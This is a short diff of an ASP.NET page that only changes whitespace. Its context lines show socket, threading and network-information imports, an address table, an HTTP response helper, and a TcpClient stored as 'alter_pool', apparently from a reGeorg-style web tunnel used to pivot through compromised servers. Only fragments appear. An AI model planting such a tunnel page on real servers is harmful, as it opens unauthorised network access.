@@ -1,13 +1,11 @@
 <%@ Page Language="C#" %>
-
 <%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Net" %>
 <%@ Import Namespace="System.Net.Sockets" %>
 <%@ Import Namespace="System.Threading" %>
 <%@ Import Namespace="System.Net.NetworkInformation" %>
 <%@ Import Namespace="System.Collections" %>
-<%@ Import Namespace="System.Collections.Generic" %>
-<script runat="server">
+<%@ Import Namespace="System.Collections.Generic" %><script runat="server">
     static Hashtable addrs = CollectAddr();
     static Hashtable ctx = Hashtable.Synchronized(new Hashtable());
 
@@ -401,10 +399,7 @@
 
         HttpWebResponse response = (HttpWebResponse)conn.GetResponse();
         return response;
-    }
-</script>
-
-<%
+    }</script><%
     if (!ctx.ContainsKey("alter_pool"))
     {
         ctx.Add("alter_pool", new TcpClient());
